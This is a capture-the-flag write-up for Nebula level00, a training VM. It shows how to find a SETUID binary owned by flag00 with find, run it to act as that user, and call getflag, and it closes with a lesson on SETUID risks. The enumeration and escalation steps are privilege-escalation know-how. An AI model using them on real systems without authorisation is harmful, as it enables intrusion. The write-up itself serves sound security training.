## 🧪 Nebula - Level00

> **Category:** Privilege Escalation (SUID)  
> **Goal:** Execute `getflag` as user `flag00`  
> **System:** GNU/Linux – Nebula VM  
> **Required skills:** Basic understanding of UNIX permissions

---

### 🔍 Description

The first level of the *Nebula* VM requires you to find a binary with the **SETUID** bit set, owned by the `flag00` user, and execute it to obtain the flag.

---

### 🔎 Finding the vulnerable file

Let's search for **SETUID** files owned by `flag00`:

```bash
find / -perm -4000 -user flag00 2>/dev/null
```

Output:

```
/bin/.../flag00
/rofs/bin/.../flag00
```

Choose the first real path `/bin/.../flag00` and explore it:

```bash
cd /bin/...
ls -l
```

Output:

```
-rwsr-x--- 1 flag00 level00 7358 ... flag00
```

The file has the **SETUID** bit (`-rws...`) and is executable by `level00`.

---

### 🚀 Executing the binary

Run it directly:

```bash
./flag00
```

Output:

```
Congrats, now run getflag to get your flag!
```

The message suggests the binary has **executed something with elevated privileges** (as `flag00`).

Let's verify:

```bash
whoami
# flag00
```

Now you can obtain the flag:

```bash
getflag
```

Output:

```
You have successfully executed getflag on a target account
```

---

### ✅ Full solution

```bash
find / -perm -4000 -user flag00 2>/dev/null
cd /bin/...
./flag00
getflag
```

---

### 🔐 Security lesson

This level demonstrates the **risks associated with SETUID binaries**. If a SETUID binary does not perform **input validation or privilege dropping**, it can be abused to **run commands with someone else's rights**, even if not directly vulnerable.

---